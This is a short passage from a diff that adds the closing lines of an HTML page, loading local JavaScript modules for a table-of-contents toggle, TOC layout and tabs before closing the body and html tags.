+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
